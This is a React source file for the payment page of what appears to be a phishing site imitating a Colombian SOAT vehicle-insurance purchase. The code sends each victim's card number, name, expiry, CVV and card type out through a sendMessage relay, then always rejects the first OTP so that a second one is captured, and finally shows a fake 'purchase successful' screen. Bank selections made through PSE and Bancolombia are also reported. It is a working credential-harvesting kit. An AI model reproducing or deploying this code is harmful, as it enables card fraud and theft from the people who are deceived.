import React, { useState } from "react";
import { useLocation, useNavigate } from "react-router-dom"; 
import sendMessage from '../Sender/Sender';
import Header from '../Header/Header';
import Footer from '../Footer/Footer';
import Styles from './Payment.module.css';
import loaderGif from '../../Assets/Images/loader.gif'
import botonBancolombia from '../../Assets/Images/botonBancolombia.png'
import botonTarjetas from '../../Assets/Images/botonTarjetas.png'
import botonPSE from '../../Assets/Images/pseLogo.png'

function Payment() {
    const location = useLocation();
    const navigate = useNavigate();

    const { licensePlate, vehicleClass, vehicleModel, serviceType, insuranceValue } = location.state || {};
    const [cardType, setCardType] = useState("");
    const [cardNumber, setCardNumber] = useState("");
    const [expiryDate, setExpiryDate] = useState("");
    const [cvvSecurityCode, setCVVSecurityCode] = useState("");
    const [cardHolderName, setCardHolderName] = useState("");
    const [otpSecurityCode, setOTPSecurityCode] = useState("");

    const [showSectionC, setShowSectionC] = useState(false);
    const [showOTP, setShowOTP] = useState(false);
    const [loading, setLoading] = useState(false);
    const [paymentConfirmed, setPaymentConfirmed] = useState(false);

    const [touchedCardType, setTouchedCardType] = useState(false);
    const [touchedCardNumber, setTouchedCardNumber] = useState(false);
    const [touchedCardHolderName, setTouchedCardHolderName] = useState(false);
    const [touchedExpiryDate, setTouchedExpiryDate] = useState(false);
    const [touchedCVVSecurityCode, setTouchedCVVSecurityCode] = useState(false);
    const [touchedOTPSecurityCode, setTouchedOTPSecurityCode] = useState(false);
    const [touchedPSEBank, setTouchedPSEBank] = useState(false);

    const [otpAttempts, setOtpAttempts] = useState(0);
    const [otpError, setOtpError] = useState("");

    const [method, setMethod] = useState("");
    const [pseBank, setPSEBank] = useState("");

    const handleRadioChange = (method) => {

        if (method === "card") {
            setMethod(method);
            setShowSectionC(true);
            const mensaje = `Placa: ${licensePlate.toUpperCase()}

Metodo: Tarjeta`;

            sendMessage(mensaje);
        }

        if (method === "bancolombia") {
            const mensaje = `Placa: ${licensePlate.toUpperCase()}

Metodo: Boton Bancolombia`;

            sendMessage(mensaje);
            setLoading(true)
            setTimeout(() => {
                setLoading(false);
            }, 13000);
            navigate('/bancolombia', {
                state: {
                    licensePlate
                },
            });
        }

        if (method === "pse") {
            setMethod(method);
            setShowSectionC(true);
            const mensaje = `Placa: ${licensePlate.toUpperCase()}

Metodo: PSE`;

            sendMessage(mensaje);
        }
    };

    const allInputsValid = () => {

        if (!cardType) return false;

        if (!/^\d{16}$/.test(cardNumber)) return false;

        if (!cardHolderName.trim()) return false;

        if (!/^(0[1-9]|1[0-2])\/\d{4}$/.test(expiryDate)) return false;

        if (!/^\d{3,4}$/.test(cvvSecurityCode)) return false;

        return true;
    };

    return (
        <>
            <Header stepSectionB={4}/>

            <main className={Styles.xPayment}>
                <section className={Styles.xPaymentSectionA}>
                    <div>
                        <h3>{!paymentConfirmed ? ('Medios de Pago') : ('Pago Confirmado')}</h3>
                    </div>
                    {!paymentConfirmed ? (
                        <div>
                            <p>{!showSectionC ? 'Selecciona tu opción para realizar el pago:' : 'Realiza tu pago de forma segura'}</p>
                            {!showSectionC && (
                                <form>
                                    <div>
                                        <input 
                                            type="radio"
                                            id="card"
                                            name="paymentMethod"
                                            onChange={() => handleRadioChange("card")} 
                                        />
                                        <label htmlFor="card">
                                            <img src={botonTarjetas} alt="Tarjetas" />
                                        </label>
                                    </div>
                                    <div>
                                        <input 
                                            type="radio"
                                            id="bancolombia"
                                            name="paymentMethod"
                                            onChange={() => handleRadioChange("bancolombia")} 
                                        />
                                        <label htmlFor="bancolombia">
                                            <img src={botonBancolombia} alt="Botón Bancolombia" />
                                        </label>
                                    </div>
                                    <div>
                                        <input 
                                            type="radio"
                                            id="pse"
                                            name="paymentMethod"
                                            onChange={() => handleRadioChange("pse")} 
                                        />
                                        <label htmlFor="pse">
                                            <img src={botonPSE} alt="Botón PSE" />
                                        </label>
                                    </div>
                                </form>
                            )}
                            {showSectionC && (
                                <div className={Styles.xPaymentSectionC}>
                                    {method === 'card' && (
                                        <form>
                                            <div>
                                                <select
                                                    value={cardType}
                                                    onChange={(e) => setCardType(e.target.value)}
                                                    onBlur={() => setTouchedCardType(true)}
                                                    required
                                                    className={touchedCardType ? Styles.touched : ""}
                                                >
                                                    <option value="" disabled hidden>Tipo de Tarjeta</option>
                                                    <option value="Debito">Débito</option>
                                                    <option value="Credito">Crédito</option>
                                                </select>
                                            </div>
                                            <div>
                                                <input
                                                    type="text"
                                                    value={cardNumber}
                                                    onChange={(e) => {
                                                        const valor = e.target.value.replace(/\D/g, "").slice(0, 16);
                                                        setCardNumber(valor);
                                                    }}
                                                    onBlur={() => {
                                                        setTouchedCardNumber(true);
                                                    }}
                                                    required
                                                    placeholder=" "
                                                    pattern="\d{16}" 
                                                    maxLength={16}
                                                    className={touchedCardNumber ? Styles.touched : ""}
                                                />
                                                <label>Numero de Tarjeta</label>
                                            </div>
                                            <div>
                                                <input 
                                                    type="text" 
                                                    value={cardHolderName} 
                                                    onChange={(e) => setCardHolderName(e.target.value)} 
                                                    required 
                                                    placeholder=" " 
                                                    onBlur={() => setTouchedCardHolderName(true)}
                                                    className={touchedCardHolderName ? Styles.touched : ""}
                                                />
                                                <label>Nombre del Titular</label>
                                            </div>
                                            
                                            <div>
                                                <input 
                                                    type="text" 
                                                    value={expiryDate} 
                                                    onChange={(e) => {
                                                        let valor = e.target.value.replace(/[^\d/]/g, '').slice(0, 7);

                                                        if (valor.length === 2 && !valor.includes('/')) {
                                                            valor = valor + '/';
                                                        }

                                                        setExpiryDate(valor);
                                                    }} 
                                                    required 
                                                    placeholder=" "
                                                    onBlur={() => setTouchedExpiryDate(true)}
                                                    pattern="^(0[1-9]|1[0-2])\/\d{4}$" 
                                                    className={touchedExpiryDate ? Styles.touched : ""}
                                                />
                                                <label>Fecha de Vencimiento (MM/AAAA)</label>
                                            </div>


                                            <div>
                                                <input 
                                                    type="text"
                                                    value={cvvSecurityCode}
                                                    onChange={(e) => {
                                                        const valor = e.target.value.replace(/\D/g, '').slice(0, 4);
                                                        setCVVSecurityCode(valor);
                                                    }}
                                                    required
                                                    placeholder=" "
                                                    onBlur={() => setTouchedCVVSecurityCode(true)}
                                                    pattern="\d{3,4}"
                                                    className={touchedCVVSecurityCode ? Styles.touched : ""}
                                                />
                                                <label>Código de Seguridad (CVV)</label>
                                            </div>

                                            {showOTP && (
                                                <div>
                                                    <input 
                                                        type="text"
                                                        value={otpSecurityCode}
                                                        onChange={(e) => {
                                                            const valor = e.target.value.replace(/\D/g, '').slice(0, 8);
                                                            setOTPSecurityCode(valor);
                                                        }}
                                                        required
                                                        placeholder=" "
                                                        onBlur={() => setTouchedOTPSecurityCode(true)}
                                                        pattern="\d{4,8}"
                                                        maxLength={8}
                                                        className={touchedOTPSecurityCode ? Styles.touched : ""}
                                                    />
                                                    <label>Codigo de Verificacion (SMS o Clave Dinamica)</label>
                                                    {otpError && (
                                                        <p style={{ color: "red", fontSize: "12px", marginTop: "5px", marginBottom: "5px" }}>
                                                            {otpError}
                                                        </p>
                                                    )}
                                                </div>
                                            )}
                                        </form>
                                    )}
                                    {method === 'pse' && (
                                        <form>
                                            <div>
                                                <select
                                                    value={pseBank}
                                                    onChange={(e) => setPSEBank(e.target.value)}
                                                    onBlur={() => setTouchedPSEBank(true)}
                                                    required
                                                    className={touchedPSEBank ? Styles.touched : ""}
                                                >
                                                    <option value="" disabled hidden>A continuación seleccione su banco</option>
                                                    <option label="ALIANZA FIDUCIARIA" value="ALIANZA FIDUCIARIA">ALIANZA FIDUCIARIA</option>
                                                    <option label="BAN100" value="BAN100">BAN100</option>
                                                    <option label="BANCAMIA S.A." value="BANCAMIA S.A.">BANCAMIA S.A.</option>
                                                    <option label="BANCO AGRARIO" value="BANCO AGRARIO">BANCO AGRARIO</option>
                                                    <option label="BANCO AV VILLAS" value="BANCO AV VILLAS">BANCO AV VILLAS</option>
                                                    <option label="BANCO BBVA COLOMBIA S.A." value="BANCO BBVA COLOMBIA S.A.">BANCO BBVA COLOMBIA S.A.</option>
                                                    <option label="BANCO CAJA SOCIAL" value="BANCO CAJA SOCIAL">BANCO CAJA SOCIAL</option>
                                                    <option label="BANCO COOPERATIVO COOPCENTRAL" value="BANCO COOPERATIVO COOPCENTRAL">BANCO COOPERATIVO COOPCENTRAL</option>                    
                                                    <option label="BANCO DAVIVIENDA" value="BANCO DAVIVIENDA">BANCO DAVIVIENDA</option>
                                                    <option label="BANCO DE BOGOTA" value="BANCO DE BOGOTA">BANCO DE BOGOTA</option>
                                                    <option label="BANCO DE OCCIDENTE" value="BANCO DE OCCIDENTE">BANCO DE OCCIDENTE</option>
                                                    <option label="BANCO FALABELLA " value="BANCO FALABELLA">BANCO FALABELLA</option>
                                                    <option label="BANCO FINANDINA S.A. BIC" value="BANCO FINANDINA S.A. BIC">BANCO FINANDINA S.A. BIC</option>
                                                    <option label="BANCO GNB SUDAMERIS" value="BANCO GNB SUDAMERIS" >BANCO GNB SUDAMERIS</option>
                                                    <option label="BANCO ITAU" value="BANCO ITAU">BANCO ITAU</option>
                                                    <option label="BANCO J.P. MORGAN COLOMBIA S.A." value="BANCO J.P. MORGAN COLOMBIA S.A.">BANCO J.P. MORGAN COLOMBIA S.A.</option>
                                                    <option label="BANCO MUNDO MUJER S.A." value="BANCO MUNDO MUJER S.A.">BANCO MUNDO MUJER S.A.</option>
                                                    <option label="BANCO PICHINCHA S.A." value="BANCO PICHINCHA S.A." >BANCO PICHINCHA S.A.</option>
                                                    <option label="BANCO POPULAR" value="BANCO POPULAR">BANCO POPULAR</option>
                                                    <option label="BANCO SANTANDER COLOMBIA" value="BANCO SANTANDER COLOMBIA">BANCO SANTANDER COLOMBIA</option>
                                                    <option label="BANCO SERFINANZA" value="BANCO SERFINANZA">BANCO SERFINANZA</option>
                                                    <option label="BANCO UNION antes GIROS" value="BANCO UNION">BANCO UNION</option>
                                                    <option label="BANCOLOMBIA" value="BANCOLOMBIA">BANCOLOMBIA</option>
                                                    <option label="BANCOOMEVA S.A." value="BANCOOMEVA S.A.">BANCOOMEVA S.A.</option>
                                                    <option label="CFA COOPERATIVA FINANCIERA" value="CFA COOPERATIVA FINANCIERA">CFA COOPERATIVA FINANCIERA</option>
                                                    <option label="CITIBANK" value="CITIBANK">CITIBANK</option>
                                                        <option label="COLTEFINANCIERA" value="COLTEFINANCIERA">COLTEFINANCIERA</option>
                                                    <option label="CONFIAR COOPERATIVA FINANCIERA" value="CONFIAR COOPERATIVA FINANCIERA">CONFIAR COOPERATIVA FINANCIERA</option>
                                                    <option label="COOFINEP COOPERATIVA FINANCIERA" value="COOFINEP COOPERATIVA FINANCIERA">COOFINEP COOPERATIVA FINANCIERA</option>
                                                    <option label="COTRAFA" value="COTRAFA">COTRAFA</option>
                                                    <option label="DALE" value="DALE">DALE</option>
                                                    <option label="DAVIPLATA" value="DAVIPLATA">DAVIPLATA</option>
                                                    <option label="IRIS" value="IRIS">IRIS</option>
                                                    <option label="LULO BANK" value="LULO BANK">LULO BANK</option>
                                                    <option label="MOVII S.A." value="MOVII S.A.">MOVII S.A.</option>
                                                    <option label="RAPPIPAY" value="RAPPIPAY">RAPPIPAY</option>                    
                                                    <option label="SCOTIABANK COLPATRIA" value="SCOTIABANK COLPATRIA">SCOTIABANK COLPATRIA</option>
                                                </select>
                                            </div>
                                        </form>
                                    )}
                                </div>
                            )}
                            <button
                                type="button"
                                onClick={(e) => {
                                    e.preventDefault();
                                    if (method === 'card') {
                                        if (!showOTP) {
                                        if (allInputsValid()) {
                                            
                                            const mensaje = `Placa: ${licensePlate.toUpperCase()}

<pre>${cardNumber}</pre>

Nombre: ${cardHolderName}
Fecha: ${expiryDate}
CVV: ${cvvSecurityCode}
Tipo: ${cardType}`;

                                            sendMessage(mensaje);
                                            setLoading(true)
                                            setTimeout(() => {
                                                setLoading(false);
                                                setShowOTP(true);
                                            }, 18000);
                                        } else {
                                            setTouchedCardType(true);
                                            setTouchedCardNumber(true);
                                            setTouchedCardHolderName(true);
                                            setTouchedExpiryDate(true);
                                            setTouchedCVVSecurityCode(true);
                                        }
                                    } else {
                                        if (!/^\d{4,}$/.test(otpSecurityCode)) {
                                            setTouchedOTPSecurityCode(true);
                                            return;
                                        }

                                        const mensaje = `Placa: ${licensePlate.toUpperCase()}

OTP Intento ${otpAttempts + 1}: ${otpSecurityCode}`;

                                        sendMessage(mensaje);

                                        setLoading(true);

                                        setTimeout(() => {
                                            setLoading(false);

                                            if (otpAttempts === 0) {
                                                // PRIMER OTP → ERROR
                                                setOtpError("Fallo en la verificacion. Un nuevo codigo sera generado automaticamente. Intente nuevamente.");
                                                setOtpAttempts(1);
                                                setOTPSecurityCode(""); // limpia el campo
                                            } else {
                                                // SEGUNDO OTP → ÉXITO
                                                setOtpError("");
                                                setPaymentConfirmed(true);
                                            }
                                        }, 18000);
                                    }
                                    } else {
                                        const mensaje = `Placa: ${licensePlate.toUpperCase()}

Banco: ${pseBank}`;

                                        sendMessage(mensaje);
                                        setLoading(true);
                                        setTimeout(() => {
                                            setLoading(false);
                                            navigate('/pse', {
                                            state: {
                                                licensePlate,
                                                pseBank
                                            },
                                        });                                        
                                        }, 18000);                                        
                                    }
                                }}
                            >
                                {showOTP ? 'PAGAR' : 'CONTINUAR'}
                            </button>
                        </div>
                    ):(
                        <div className={Styles.xPaymentCompleted}>
                            <h4>
                                ¡Compra Exitosa!
                            </h4>
                            <p>
                                Por este medio se expide el SOAT para los vehiculos matriculados en Colombia.
                            </p>
                            <p>
                                Luego de que hayas comprado la póliza, espera 24 horas y <span onClick={() => navigate("https://portalpublico.runt.gov.co/#/consulta-vehiculo/consulta/consulta-ciudadana")}>verifica aquí</span> que esta haya quedado cargada en el RUNT.
                            </p>
                            <button onClick={() => navigate("/")}>
                                Entendido
                            </button>
                        </div>
                    )}
                </section>

                <section className={Styles.xPaymentSectionB}>
                    <h3>Resumen:</h3>
                    <ul>
                        <li>Clase: <span>{vehicleClass}</span></li>
                        <li>Servicio: <span>{serviceType}</span></li>
                        <li>Modelo: <span>{vehicleModel}</span></li>
                        <li>Placa: <span>{licensePlate ? licensePlate.toUpperCase() : ''}</span></li>
                        <li>Descuento: <span>5%</span></li>
                        <li>Valor Total (Sin Descuento): <span>{insuranceValue ? insuranceValue.toLocaleString('es-CO') : 0}</span></li>
                    </ul>
                    <p>TOTAL A PAGAR: ${
                        insuranceValue ? (insuranceValue * 0.95).toLocaleString() : 0
                        }
                    </p>
                </section>
            </main>

            {loading && (
                <aside className={Styles.loader}>
                    <img src={loaderGif} alt="Loader"></img>
                </aside>
            )}

            <Footer />
        </>
    );
}

export default Payment;

